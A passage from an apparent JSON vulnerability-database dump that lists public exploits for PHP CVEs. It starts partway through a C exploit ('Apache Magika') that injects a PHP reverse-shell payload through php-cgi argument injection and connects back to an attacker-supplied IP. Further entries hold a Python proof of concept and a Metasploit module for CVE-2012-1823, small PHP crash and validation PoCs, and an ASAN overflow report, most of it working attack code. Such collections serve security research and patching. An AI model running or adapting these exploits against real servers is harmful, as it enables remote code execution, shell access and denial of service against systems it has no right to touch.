\\\r\n\"\\n\" \\\r\n\"fclose($sock);\\n\" \\\r\n\"fclose($pipes[0]);\\n\" \\\r\n\"fclose($pipes[1]);\\n\" \\\r\n\"fclose($pipes[2]);\\n\" \\\r\n\"proc_close($process);\\n\" \\\r\n\"function printit ($string) {\\n\" \\\r\n\"\tif (!$daemon) {\\n\" \\\r\n\"\t\tprint \\\"$string\\n\\\";\\n\" \\\r\n\"\t}\\n\" \\\r\n\"}\\n\" \\\r\n\"exit(1);\\n\" \\\r\n\"?>\";\r\n\r\nstruct sockaddr_in *gethostbyname_(char *hostname, unsigned short port)\r\n{\r\n struct hostent *he;\r\n struct sockaddr_in server, *servercopy;\r\n \r\n if ((he=gethostbyname(hostname)) == NULL) {\r\n  printf(\"Hostname cannot be resolved\\n\");\r\n  exit(255);\r\n }\r\n \r\n servercopy = malloc(sizeof(struct sockaddr_in));\r\n if (!servercopy) {\r\n\tprintf(\"malloc error (1)\\n\");\r\n\texit(255);\r\n }\r\n memset(&server, '\\0', sizeof(struct sockaddr_in));\r\n memcpy(&server.sin_addr, he->h_addr_list[0],  he->h_length);\r\n server.sin_family = AF_INET;\r\n server.sin_port = htons(port);\r\n memcpy(servercopy, &server, sizeof(struct sockaddr_in));\r\n return servercopy;\r\n}\r\n\r\nchar *sslread(connection *c)\r\n{\r\n  char *rc = NULL;\r\n  int received, count = 0, count2=0;\r\n  char ch;\r\n\r\n  for(;;)\r\n  {\r\n   if (!rc)\r\n    rc = calloc(1024, sizeof (char) + 1);\r\n   else\r\n    if (count2 % 1024 == 0) {\r\n     rc = realloc(rc, (count2 + 1) * 1024 * sizeof (char) + 1);\r\n    }\r\n    received = SSL_read(c->handle, &ch, 1);\r\n    if (received == 1) {\r\n     rc[count++] = ch;\r\n     count2++;\r\n     if (count2 > 1024*5)\r\n\t  break;\r\n    }\r\n    else\r\n     break;\r\n   }\r\n  return rc;\r\n}\r\n\r\nchar *read_(int sockfd)\r\n{\r\n  char *rc = NULL;\r\n  int received, count = 0, count2=0;\r\n  char ch;\r\n\r\n  for(;;)\r\n  {\r\n   if (!rc)\r\n    rc = calloc(1024, sizeof (char) + 1);\r\n   else\r\n    if (count2 % 1024 == 0) {\r\n     rc = realloc(rc, (count2 + 1) * 1024 * sizeof (char) + 1);\r\n    }\r\n    received = read(sockfd, &ch, 1);\r\n    if (received == 1) {\r\n     rc[count++] = ch;\r\n     count2++;\r\n     if (count2 > 1024*5)\r\n\t  break;\r\n    }\r\n    else\r\n     break;\r\n   }\r\n  return rc;\r\n}\r\n\r\nvoid main(int argc, char *argv[])\r\n{\r\n  char *target, *protocol, *targetip, *writestr, *tmpstr, *readbuf=NULL,\r\n   *interpreter, *reverseip, *reverseportstr, *forceinterpreter=NULL;\r\n  char httpsflag=0;\r\n  unsigned short port=0, reverseport=0;\r\n  struct sockaddr_in *server;\r\n  int sockfd;\r\n  unsigned int writesize, tmpsize;\r\n  unsigned int i;\r\n  connection *sslconnection;\r\n  printf(\"-== Apache Magika by Kingcope ==-\\n\");\r\n  for(;;)\r\n  {\r\n\t int c;\r\n     int option_index=0;\r\n     static struct option long_options[] = {\r\n\t   {\"target\", required_argument, 0, 0 },\r\n\t   {\"port\", required_argument, 0, 0 },\r\n\t   {\"protocol\", required_argument, 0, 0 },\r\n\t   {\"reverse-ip\", required_argument, 0, 0 },\r\n\t   {\"reverse-port\", required_argument, 0, 0 },\r\n\t   {\"force-interpreter\", required_argument, 0, 0 },\t   \r\n\t   {0, 0, 0, 0 }\r\n\t  };\r\n\t \r\n\t c = getopt_long(argc, argv, \"\", long_options, &option_index);\r\n     if (c < 0)\r\n     \tbreak;\r\n     \r\n     switch (c) {\r\n\t case 0:\r\n\t  switch (option_index) {\r\n\t   case 0:\r\n\t    if (optarg) {\r\n\t     target = calloc(strlen(optarg)+1, sizeof(char));\r\n\t     if (!target) {\r\n\t\t  printf(\"calloc error (2)\\n\");\r\n\t      exit(255);\r\n         }\r\n\t     memcpy(target, optarg, strlen(optarg)+1);\r\n    \t}\r\n        break;\r\n       case 1:\r\n        if(optarg)\r\n\t     port = atoi(optarg);\r\n        break;\r\n       case 2:\r\n        protocol = calloc(strlen(optarg)+1, sizeof(char));\r\n        if (!protocol) {\r\n\t     printf(\"calloc error (3)\\n\");\r\n         exit(255);\r\n        }\r\n        memcpy(protocol, optarg, strlen(optarg)+1);\r\n        if (!strcmp(protocol, \"https\"))\r\n         httpsflag=1;\r\n        break;\r\n       case 3:\r\n        reverseip = calloc(strlen(optarg)+1, sizeof(char));\r\n        if (!reverseip) {\r\n\t     printf(\"calloc error (4)\\n\");\r\n         exit(255);\r\n        }\r\n        memcpy(reverseip, optarg, strlen(optarg)+1);       \r\n        break;\r\n       case 4:\r\n\t    reverseport = atoi(optarg);       \r\n\t\treverseportstr = calloc(strlen(optarg)+1, sizeof(char));\r\n        if (!reverseportstr) {\r\n\t     printf(\"calloc error (5)\\n\");\r\n         exit(255);\r\n        }\r\n        memcpy(reverseportstr, optarg, strlen(optarg)+1);  \t     \r\n        break;\r\n       case 5:\r\n        forceinterpreter = calloc(strlen(optarg)+1, sizeof(char));\r\n        if (!forceinterpreter) {\r\n\t     printf(\"calloc error (6)\\n\");\r\n         exit(255);\r\n        }\r\n        memcpy(forceinterpreter, optarg, strlen(optarg)+1);       \r\n        break;\r\n       default:\r\n        usage(argv);\r\n\t  }\r\n\t  break;\r\n\t \r\n\t default:\r\n\t  usage(argv);\r\n     }\r\n  }\r\n\r\n  if ((optind < argc) || !target || !protocol || !port ||\r\n      !reverseip || !reverseport){\r\n\tusage(argv);\r\n  }\r\n  \r\n  server = gethostbyname_(target, port);\r\n  if (!server) {\r\n   printf(\"Error while resolving hostname. (7)\\n\");\r\n   exit(255);\r\n  }\r\n\r\n  char *interpreters[5];\r\n  int ninterpreters = 5;\r\n  interpreters[0] = strdup(\"/cgi-bin/php\");\r\n  interpreters[1] = strdup(\"/cgi-bin/php5\");\r\n  interpreters[2] = strdup(\"/cgi-bin/php-cgi\");\r\n  interpreters[3] = strdup(\"/cgi-bin/php.cgi\");\r\n  interpreters[4] = strdup(\"/cgi-bin/php4\");\r\n  \r\n  for (i=0;i<ninterpreters;i++) {\r\n   interpreter = interpreters[i];\r\n   if (forceinterpreter) {\r\n     interpreter = strdup(forceinterpreter);\r\n   }\r\n   if (forceinterpreter && i)\r\n    break;\r\n   printf(\"%s\\n\", interpreter);\r\n   \r\n   sockfd = socket(AF_INET, SOCK_STREAM, 0);\r\n   if (sockfd < 1) { \r\n\t printf(\"socket error (8)\\n\");\r\n\t exit(255);\r\n   }\r\n  \r\n   if (connect(sockfd, (void*)server, sizeof(struct sockaddr_in)) < 0) {\r\n    printf(\"connect error (9)\\n\");\r\n    exit(255);\t  \r\n   }\r\n   if (httpsflag) {\r\n    sslconnection = (connection*) malloc(sizeof(connection));\r\n    if (!sslconnection) {\r\n     printf(\"malloc error (10)\\n\");\r\n     exit(255);   \r\n    }\r\n    sslconnection->handle = NULL;\r\n    sslconnection->ctx = NULL;\r\n\r\n    SSL_library_init();\r\n\r\n    sslconnection->ctx = SSL_CTX_new(SSLv23_client_method());\r\n    if (!sslconnection->ctx) {\r\n \t printf(\"SSL_CTX_new error (11)\\n\");\r\n     exit(255);\r\n    }\r\n\r\n    sslconnection->handle = SSL_new(sslconnection->ctx);\r\n    if (!sslconnection->handle) {\r\n \t printf(\"SSL_new error (12)\\n\");\r\n\t exit(255);   \r\n    }\r\n    if (!SSL_set_fd(sslconnection->handle, sockfd)) {\r\n \t printf(\"SSL_set_fd error (13)\\n\");\r\n     exit(255);\r\n    }\r\n   \r\n    if (SSL_connect(sslconnection->handle) != 1) {\r\n\t printf(\"SSL_connect error (14)\\n\");\r\n     exit(255);       \r\n    }\r\n   }\r\n  \r\n   tmpsize = strlen(phpstr) + strlen(reverseip) + strlen(reverseportstr) + 64;\r\n   tmpstr = (char*)calloc(tmpsize, sizeof(char));\r\n   snprintf(tmpstr, tmpsize, phpstr, reverseip, reverseport);\r\n   \r\n   writesize = strlen(target) + strlen(interpreter) + \r\n     strlen(poststr) + strlen(tmpstr) + 64;\r\n   writestr = (char*)calloc(writesize, sizeof(char));\r\n   snprintf(writestr, writesize, poststr, interpreter,\r\n     target, strlen(tmpstr), tmpstr);\r\n  \r\n   if (!httpsflag) {\r\n\t write(sockfd, writestr, strlen(writestr));\r\n\t readbuf = read_(sockfd);\r\n   } else {\r\n\t SSL_write(sslconnection->handle, writestr, strlen(writestr));\r\n\t readbuf = sslread(sslconnection);\r\n   }\r\n  \r\n   if (readbuf) {\r\n     printf(\"***SERVER RESPONSE***\\n\\n%s\\n\\n\", readbuf);  \r\n   } else {\r\n    printf(\"read error (15)\\n\");\r\n    exit(255);\t  \r\n   }\r\n  }\r\n  exit(1);\r\n}\r\n\r\n",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:29290"
        },
        {
            "bulletinFamily": "exploit",
            "description": "PHP CGI Argument Injection Exploit. CVE-2012-1823,CVE-2012-2311,CVE-2012-2336. Remote exploit for php platform",
            "modified": "2012-05-05T00:00:00",
            "published": "2012-05-05T00:00:00",
            "id": "EDB-ID:18836",
            "href": "https://www.exploit-db.com/exploits/18836/",
            "type": "exploitdb",
            "title": "PHP CGI Argument Injection Exploit",
            "sourceData": "######################################################################################\r\n# Exploit Title: Cve-2012-1823 PHP CGI Argument Injection Exploit\r\n# Date: May 4, 2012\r\n# Author: rayh4c[0x40]80sec[0x2e]com\r\n# Exploit Discovered by wofeiwo[0x40]80sec[0x2e]com\r\n######################################################################################\r\n\r\nimport socket\r\nimport sys\r\n\r\ndef cgi_exploit():\r\n        pwn_code = \"\"\"<?php phpinfo();?>\"\"\" \r\n        post_Length = len(pwn_code)\r\n        http_raw=\"\"\"POST /?-dallow_url_include%%3don+-dauto_prepend_file%%3dphp://input HTTP/1.1\r\nHost: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %s\r\n\r\n%s\r\n\"\"\" %(HOST , post_Length ,pwn_code)\r\n        print http_raw\r\n        try:\r\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n            sock.connect((HOST, int(PORT)))\r\n            sock.send(http_raw)\r\n            data = sock.recv(10000)\r\n            print repr(data)\r\n            sock.close()\r\n        except socket.error, msg:\r\n            sys.stderr.write(\"[ERROR] %s\\n\" % msg[1])\r\n            sys.exit(1)\r\n               \r\nif __name__ == '__main__':\r\n        try:\r\n            HOST = sys.argv[1]\r\n            PORT = sys.argv[2]\r\n            cgi_exploit()\r\n        except IndexError:\r\n            print '[+]Usage: cgi_test.py site.com 80'\r\n            sys.exit(-1)",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:18836"
        },
        {
            "bulletinFamily": "exploit",
            "description": "PHP CGI Argument Injection. CVE-2012-1823,CVE-2012-2311,CVE-2012-2336. Remote exploit for php platform",
            "modified": "2012-05-04T00:00:00",
            "published": "2012-05-04T00:00:00",
            "id": "EDB-ID:18834",
            "href": "https://www.exploit-db.com/exploits/18834/",
            "type": "exploitdb",
            "title": "PHP CGI Argument Injection",
            "sourceData": "##\r\n# $Id$\r\n##\r\n\r\n##\r\n# This file is part of the Metasploit Framework and may be subject to\r\n# redistribution and commercial restrictions. Please see the Metasploit\r\n# web site for more information on licensing and terms of use.\r\n#   http://metasploit.com/\r\n##\r\n\r\nrequire 'msf/core'\r\n\r\nclass Metasploit3 < Msf::Exploit::Remote\r\n\tRank = ExcellentRanking\r\n\r\n\tinclude Msf::Exploit::Remote::HttpClient\r\n\r\n\tdef initialize(info = {})\r\n\t\tsuper(update_info(info,\r\n\t\t\t'Name'           => 'PHP CGI Argument Injection',\r\n\t\t\t'Description'    => %q{\r\n\t\t\t\tWhen run as a CGI, PHP up to version 5.3.12 and 5.4.2 is vulnerable to\r\n\t\t\t\tan argument injection vulnerability.  This module takes advantage of\r\n\t\t\t\tthe -d flag to set php.ini directives to achieve code execution.\r\n\t\t\t\tFrom the advisory: \"if there is NO unescaped '=' in the query string,\r\n\t\t\t\tthe string is split on '+' (encoded space) characters, urldecoded,\r\n\t\t\t\tpassed to a function that escapes shell metacharacters (the \"encoded in\r\n\t\t\t\ta system-defined manner\" from the RFC) and then passes them to the CGI\r\n\t\t\t\tbinary.\"\r\n\t\t\t},\r\n\t\t\t'Author'         => [ 'egypt', 'hdm' ],\r\n\t\t\t'License'        => MSF_LICENSE,\r\n\t\t\t'Version'        => '$Revision$',\r\n\t\t\t'References'     => [\r\n\t\t\t\t\t[ \"CVE\"\t, \"2012-1823\" ],\r\n\t\t\t\t\t[ \"URL\"\t, \"http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/\" ],\r\n\t\t\t\t],\r\n\t\t\t'Privileged'     => false,\r\n\t\t\t'Payload'        =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'DisableNops' => true,\r\n\t\t\t\t\t# Arbitrary big number. The payload gets sent as an HTTP\r\n\t\t\t\t\t# response body, so really it's unlimited\r\n\t\t\t\t\t'Space'       => 262144, # 256k\r\n\t\t\t\t},\r\n\t\t\t'DisclosureDate' => 'May 03 2012',\r\n\t\t\t'Platform'       => 'php',\r\n\t\t\t'Arch'           => ARCH_PHP,\r\n\t\t\t'Targets'        => [[ 'Automatic', { }]],\r\n\t\t\t'DefaultTarget' => 0))\r\n\r\n\t\tregister_options([\r\n\t\t\tOptString.new('TARGETURI', [false, \"The URI to request (must be a CGI-handled PHP script)\"]),\r\n\t\t\t], self.class)\r\n\tend\r\n\r\n\t# php-cgi -h\r\n\t# ...\r\n\t#   -s               Display colour syntax highlighted source.\r\n\tdef check\r\n\t\turi = target_uri.path\r\n\r\n\t\turi.gsub!(/\\?.*/, \"\")\r\n\r\n\t\tprint_status(\"Checking uri #{uri}\")\r\n\r\n\t\tresponse = send_request_raw({ 'uri' => uri })\r\n\r\n\t\tif response and response.code == 200 and response.body =~ /\\<code\\>\\<span style.*\\&lt\\;\\?/mi\r\n\t\t\tprint_error(\"Server responded in a way that was ambiguous, could not determine whether it was vulnerable\")\r\n\t\t\treturn Exploit::CheckCode::Unknown\r\n\t\tend\r\n\r\n\t\tresponse = send_request_raw({ 'uri' => uri + '?-s'})\r\n\t\tif response and response.code == 200 and response.body =~ /\\<code\\>\\<span style.*\\&lt\\;\\?/mi\r\n\t\t\treturn Exploit::CheckCode::Vulnerable\r\n\t\tend\r\n\r\n\t\tprint_error(\"Server responded indicating it was not vulnerable\")\r\n\t\treturn Exploit::CheckCode::Safe\r\n\tend\r\n\r\n\tdef exploit\r\n\t\tbegin\r\n\t\t\targs = [\r\n\t\t\t\t\"-d+allow_url_include%3d#{rand_php_ini_true}\",\r\n\t\t\t\t\"-d+safe_mode%3d#{rand_php_ini_false}\",\r\n\t\t\t\t\"-d+suhosin.simulation%3d#{rand_php_ini_true}\",\r\n\t\t\t\t\"-d+disable_functions%3d%22%22\",\r\n\t\t\t\t\"-d+open_basedir%3dnone\",\r\n\t\t\t\t\"-d+auto_prepend_file%3dphp://input\",\r\n\t\t\t\t\"-n\"\r\n\t\t\t]\r\n\r\n\t\t\tqs = args.join(\"+\")\r\n\t\t\turi = \"#{target_uri}?#{qs}\"\r\n\r\n\t\t\t# Has to be all on one line, so gsub out the comments and the newlines\r\n\t\t\tpayload_oneline = \"<?php \" + payload.encoded.gsub(/\\s*#.*$/, \"\").gsub(\"\\n\", \"\")\r\n\t\t\tresponse = send_request_cgi( {\r\n\t\t\t\t'method' => \"POST\",\r\n\t\t\t\t'global' => true,\r\n\t\t\t\t'uri'    => uri,\r\n\t\t\t\t'data'   => payload_oneline,\r\n\t\t\t}, 0.5)\r\n\t\t\thandler\r\n\r\n\t\trescue ::Interrupt\r\n\t\t\traise $!\r\n\t\trescue ::Rex::HostUnreachable, ::Rex::ConnectionRefused\r\n\t\t\tprint_error(\"The target service unreachable\")\r\n\t\trescue ::OpenSSL::SSL::SSLError\r\n\t\t\tprint_error(\"The target failed to negotiate SSL, is this really an SSL service?\")\r\n\t\tend\r\n\r\n\tend\r\n\r\n\tdef rand_php_ini_false\r\n\t\tRex::Text.to_rand_case([ \"0\", \"off\", \"false\" ][rand(3)])\r\n\tend\r\n\r\n\tdef rand_php_ini_true\r\n\t\tRex::Text.to_rand_case([ \"1\", \"on\", \"true\" ][rand(3)])\r\n\tend\r\n\r\nend\r\n",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:18834"
        }
    ],
    "CVE-2010-3870": [
        {
            "bulletinFamily": "exploit",
            "description": "PHP 5.3.2 'xml_utf8_decode()' UTF-8 Input Validation Vulnerability. CVE-2010-3870. Remote exploit for php platform",
            "modified": "2009-05-11T00:00:00",
            "published": "2009-05-11T00:00:00",
            "id": "EDB-ID:34950",
            "href": "https://www.exploit-db.com/exploits/34950/",
            "type": "exploitdb",
            "title": "PHP <= 5.3.2 - 'xml_utf8_decode' UTF-8 Input Validation Vulnerability",
            "sourceData": "source: http://www.securityfocus.com/bid/44605/info\r\n\r\nPHP is prone to a vulnerability because it fails to sufficiently sanitize user-supplied input.\r\n\r\nExploiting this issue can allow attackers to provide unexpected input and possibly bypass input-validation protection mechanisms. This can aid in further attacks that may utilize crafted user-supplied input.\r\n\r\nVersions prior to PHP 5.3.4 are vulnerable.\r\n\r\n<?php\r\n$ill=chr(0xf0).chr(0xc0).chr(0xc0).chr(0xa7);\r\n$ill=addslashes($ill);\r\necho utf8_decode(\"$ill\");\r\necho htmlspecialchars ($ill,ENT_QUOTES,\"utf-8\" );\r\n?>\r\n\r\n",
            "cvss": {
                "score": 6.8,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:34950"
        }
    ],
    "CVE-2011-3182": [
        {
            "bulletinFamily": "exploit",
            "description": "PHP Prior to 5.3.7 Multiple NULL Pointer Dereference Denial Of Service Vulnerabilities. CVE-2011-3182. Dos exploit for php platform",
            "modified": "2011-08-19T00:00:00",
            "published": "2011-08-19T00:00:00",
            "id": "EDB-ID:36070",
            "href": "https://www.exploit-db.com/exploits/36070/",
            "type": "exploitdb",
            "title": "PHP Prior to 5.3.7 Multiple NULL Pointer Dereference Denial Of Service Vulnerabilities",
            "sourceData": "source: http://www.securityfocus.com/bid/49249/info\r\n\r\nPHP is prone to multiple denial-of-service vulnerabilities caused by a NULL-pointer dereference.\r\n\r\nAn attacker can exploit these issues to cause an application written in PHP to crash, denying service to legitimate users.\r\n\r\nPHP 5.3.7 is vulnerable; other versions may also be affected. \r\n\r\n127# ulimit -m 100000\r\n127# ulimit -v 100000\r\n127# cat /www/strtotime.php\r\n<?php\r\n$strx=str_repeat(\"A\",$argv[1]);\r\nvar_dump(strtotime($strx));\r\n?>127#\r\n127#  /cxib/5371/build/bin/php /www/strtotime.php 33388888\r\nMemory fault (core dumped)\r\n\r\n127# gdb -q /cxib/5371/build/bin/php\r\n(gdb) r /www/strtotime.php 33388888\r\nStarting program: /cxib/5371/build/bin/php /www/strtotime.php 33388888\r\n\r\nProgram received signal SIGSEGV, Segmentation fault.\r\n0x0806e8bd in add_error (s=0xbfbfcf90,\r\n    error=0x83ea7d8 \"Double timezone specification\")\r\n    at /cxib/5371/ext/date/lib/parse_date.c:355\r\n355             s->errors->error_messages[s->errors->error_count -\r\n1].position = s->tok ? s->tok - s->str : 0;\r\n(gdb) print s->errors->error_messages\r\n$1 = (struct timelib_error_message *) 0x0\r\n(gdb) print s->errors->error_count\r\n$2 = 1835009",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:36070"
        }
    ],
    "CVE-2010-4697": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 45952\r\nCVE ID: CVE-2010-4697\r\n\r\nPHP\u662f\u4e00\u79cdHTML\u5185\u5d4c\u5f0f\u7684\u8bed\u8a00\uff0cPHP\u4e0e\u5fae\u8f6f\u7684ASP\u9887\u6709\u51e0\u5206\u76f8\u4f3c\uff0c\u90fd\u662f\u4e00\u79cd\u5728\u670d\u52a1\u5668\u7aef\u6267\u884c\u7684\u5d4c\u5165HTML\u6587\u6863\u7684\u811a\u672c\u8bed\u8a00\uff0c\u8bed\u8a00\u7684\u98ce\u683c\u6709\u7c7b\u4f3c\u4e8eC\u8bed\u8a00\uff0c\u73b0\u5728\u88ab\u5f88\u591a\u7684\u7f51\u7ad9\u7f16\u7a0b\u4eba\u5458\u5e7f\u6cdb\u7684\u8fd0\u7528\u3002\r\n\r\nPHP 5.2.15\u4e4b\u524d\u7248\u672c\u548c5.3.4\u4e4b\u524d\u7248\u672c\u7684Zend\u5f15\u64ce\u4e2d\u5b58\u5728\u91ca\u653e\u540e\u91cd\u7528\u6f0f\u6d1e\uff0c\u901a\u8fc7\u5f15\u7528\u6240\u8bbf\u95ee\u5bf9\u8c61\u4e0a\u7684use of __set, __get, __isset\u548c__unset\u65b9\u6cd5\uff0c\u653b\u51fb\u8005\u53ef\u9020\u6210\u62d2\u7edd\u670d\u52a1\u6216\u5176\u4ed6\u653b\u51fb\u3002\r\n0\r\nPHP 5.3.x\r\nPHP 5.2.x\r\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nPHP\r\n---\r\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\n\r\nhttp://www.php.net",
            "modified": "2012-04-12T00:00:00",
            "published": "2012-04-12T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-60052",
            "id": "SSV:60052",
            "type": "seebug",
            "title": "PHP Zend\u5f15\u64ce\u91ca\u653e\u540e\u91cd\u7528\u5806\u7834\u574f\u6f0f\u6d1e(CVE-2010-4697)",
            "sourceData": "",
            "cvss": {
                "score": 6.8,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:60052"
        }
    ],
    "CVE-2012-0831": [
        {
            "bulletinFamily": "exploit",
            "description": "Bugtraq ID: 51954\r\nCVE ID\uff1aCVE-2012-0831\r\n\r\nPhp\u5b58\u5728\u4e00\u4e2a\u5b89\u5168\u6f0f\u6d1e\u5141\u8bb8\u8fdc\u7a0b\u7981\u7528magic_quotes_gpc\uff0c\u8fd9\u5141\u8bb8\u8fdc\u7a0b\u653b\u51fb\u8005\u7ed5\u8fc7\u9632\u6b62SQL\u6ce8\u5165\u7684\u9650\u5236\r\n0\r\nPHP 5.3.8\r\nPHP 5.3.7\r\nPHP 5.3.6\r\nPHP 5.3.2\r\nPHP 5.2.4\r\nPHP 5.3.5\r\nPHP 5.3.4\r\nPHP 5.3.3\r\n\u5382\u5546\u89e3\u51b3\u65b9\u6848\r\n\r\n\u7528\u6237\u53ef\u53c2\u8003\u5982\u4e0b\u4f9b\u5e94\u5546\u63d0\u4f9b\u7684\u5b89\u5168\u516c\u544a\u83b7\u5f97\u8865\u4e01\u4fe1\u606f\uff1a\r\nhttps://bugs.php.net/bug.php?id=61043",
            "modified": "2012-02-13T00:00:00",
            "published": "2012-02-13T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-30102",
            "id": "SSV:30102",
            "type": "seebug",
            "title": "PHP 'magic_quotes_gpc'\u5b89\u5168\u7ed5\u8fc7\u6f0f\u6d1e(CVE-2012-0831)",
            "sourceData": "",
            "cvss": {
                "score": 6.8,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:30102"
        }
    ],
    "CVE-2018-7584": [
        {
            "bulletinFamily": "exploit",
            "description": "PHP 7.2.2 - 'php_stream_url_wrap_http_ex' Buffer Overflow. CVE-2018-7584. Dos exploit for PHP platform",
            "modified": "2018-06-06T00:00:00",
            "published": "2018-06-06T00:00:00",
            "id": "EDB-ID:44846",
            "href": "https://www.exploit-db.com/exploits/44846/",
            "type": "exploitdb",
            "title": "PHP 7.2.2 - 'php_stream_url_wrap_http_ex' Buffer Overflow",
            "sourceData": "Description:\r\n------------\r\nThe latest PHP distributions contain a memory corruption bug while parsing malformed HTTP response packets. Vulnerable code at:\r\n\r\nphp_stream_url_wrap_http_ex /home/weilei/php-7.2.2/ext/standard/http_fopen_wrapper.c:723\r\n\r\n\t\t\tif (tmp_line[tmp_line_len - 1] == '\\n') {\r\n\t\t\t\t--tmp_line_len;\r\n\t\t\t\tif (tmp_line[tmp_line_len - 1] == '\\r') {\r\n\t\t\t\t\t--tmp_line_len;\r\n\t\t\t\t}\r\n}\r\n\r\nIf the proceeding buffer contains '\\r' as either controlled content or junk on stack, under a realistic setting (non-ASAN), tmp_line_len could go do -1, resulting in an extra large string being copied subsequently. Under ASAN a segfault can be observed.\r\n\r\n$ bin/php --version\r\nPHP 7.2.2 (cli) (built: Feb 20 2018 08:51:24) ( NTS )\r\nCopyright (c) 1997-2018 The PHP Group\r\nZend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies\r\n\r\n\r\nTest script:\r\n---------------\r\n$ xxd -g 1 poc\r\n0000000: 30 30 30 30 30 30 30 30 30 31 30 30 0a 0a        000000000100..\r\n\r\n$ nc -vvlp 8080 < poc\r\nListening on [0.0.0.0] (family 0, port 8080)\r\nConnection from [127.0.0.1] port 8080 [tcp/http-alt] accepted (family 2, sport 53083)\r\nGET / HTTP/1.0\r\nHost: localhost:8080\r\nConnection: close\r\n\r\n$ bin/php -r 'file_get_contents(\"http://localhost:8080\");'\r\n\r\nExpected result:\r\n----------------\r\nNO CRASH\r\n\r\nActual result:\r\n--------------\r\n$ bin/php -r 'file_get_contents(\"http://localhost:8080\");'\r\n=================================================================\r\n==26249== ERROR: AddressSanitizer: stack-buffer-overflow on address 0xbfc038ef at pc 0x8aa393b bp 0xbfc02eb8 sp 0xbfc02eac\r\nREAD of size 1 at 0xbfc038ef thread T0\r\n    #0 0x8aa393a in php_stream_url_wrap_http_ex /home/weilei/php-7.2.2/ext/standard/http_fopen_wrapper.c:723\r\n    #1 0x8aa61fb in php_stream_url_wrap_http /home/weilei/php-7.2.2/ext/standard/http_fopen_wrapper.c:979\r\n    #2 0x8b8b115 in _php_stream_open_wrapper_ex /home/weilei/php-7.2.2/main/streams/streams.c:2027\r\n    #3 0x8918dc0 in zif_file_get_contents /home/weilei/php-7.2.2/ext/standard/file.c:550\r\n    #4 0x867993a in phar_file_get_contents /home/weilei/php-7.2.2/ext/phar/func_interceptors.c:224\r\n    #5 0x91ee267 in ZEND_DO_ICALL_SPEC_RETVAL_UNUSED_HANDLER /home/weilei/php-7.2.2/Zend/zend_vm_execute.h:573\r\n    #6 0x91ee267 in execute_ex /home/weilei/php-7.2.2/Zend/zend_vm_execute.h:59731\r\n    #7 0x923c13c in zend_execute /home/weilei/php-7.2.2/Zend/zend_vm_execute.h:63760\r\n    #8 0x8cba975 in zend_eval_stringl /home/weilei/php-7.2.2/Zend/zend_execute_API.c:1082\r\n    #9 0x8cbaf66 in zend_eval_stringl_ex /home/weilei/php-7.2.2/Zend/zend_execute_API.c:1123\r\n    #10 0x8cbb06b in zend_eval_string_ex /home/weilei/php-7.2.2/Zend/zend_execute_API.c:1134\r\n    #11 0x9244455 in do_cli /home/weilei/php-7.2.2/sapi/cli/php_cli.c:1042\r\n    #12 0x9246b37 in main /home/weilei/php-7.2.2/sapi/cli/php_cli.c:1404\r\n    #13 0xb5e8ca82 (/lib/i386-linux-gnu/libc.so.6+0x19a82)\r\n    #14 0x80656d0 in _start (/home/weilei/php7_asan/bin/php+0x80656d0)\r\nAddress 0xbfc038ef is located at offset 607 in frame <php_stream_url_wrap_http_ex> of T0's stack:\r\n  This frame has 13 object(s):\r\n    [32, 36) 'transport_string'\r\n    [96, 100) 'errstr'\r\n    [160, 164) 'http_header_line_length'\r\n    [224, 232) 'timeout'\r\n    [288, 296) 'req_buf'\r\n    [352, 360) 'tmpstr'\r\n    [416, 432) 'ssl_proxy_peer_name'\r\n    [480, 496) 'http_header'\r\n    [544, 576) 'buf'\r\n    [608, 736) 'tmp_line'\r\n    [768, 1792) 'location'\r\n    [1824, 2848) 'new_path'\r\n    [2880, 3904) 'loc_path'\r\nHINT: this may be a false positive if your program uses some custom stack unwind mechanism or swapcontext\r\n      (longjmp and C++ exceptions *are* supported)\r\nSUMMARY: AddressSanitizer: stack-buffer-overflow /home/weilei/php-7.2.2/ext/standard/http_fopen_wrapper.c:723 php_stream_url_wrap_http_ex\r\nShadow bytes around the buggy address:\r\n  0x37f806c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\r\n  0x37f806d0: 00 00 f1 f1 f1 f1 04 f4 f4 f4 f2 f2 f2 f2 04 f4\r\n  0x37f806e0: f4 f4 f2 f2 f2 f2 04 f4 f4 f4 f2 f2 f2 f2 00 f4\r\n  0x37f806f0: f4 f4 f2 f2 f2 